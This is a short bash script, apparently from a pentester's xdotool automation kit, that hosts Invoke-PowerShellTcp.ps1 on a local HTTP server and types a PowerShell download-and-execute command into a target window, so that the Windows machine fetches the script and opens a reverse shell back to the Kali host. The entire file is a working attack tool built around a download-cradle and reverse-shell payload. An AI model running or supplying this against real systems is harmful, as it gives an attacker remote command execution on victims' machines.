#!/bin/bash

: '
ps: download Invoke-PowerShellTcp.ps1 to server and start shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Http port" "Shell port"

HTTP_PORT=${form_data["Http port"]}
SHELL_PORT=${form_data["Shell port"]}

cd ~/Desktop/base/code/xdotool/scripts/shell/windows/.files
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

FILES_FOLDER="$HOME/Desktop/base/code/xdotool/scripts/shell/windows/.files"

SRC_FILE="${FILES_FOLDER}/Invoke-PowerShellTcp.ps1"
TMP_FILE="${FILES_FOLDER}/PowerShellTcp-shell.ps1"

cp $SRC_FILE $TMP_FILE
echo "Invoke-PowerShellTcp -Reverse -IPAddress ${KALI_IP} -Port ${SHELL_PORT}" >> $TMP_FILE

paste_command "powershell iex(new-object net.webclient).downloadstring('http://${KALI_IP}:${HTTP_PORT}/PowerShellTcp-shell.ps1')"
xdotool key Return
sleep 60

kill $HTTP_PID
rm $TMP_FILE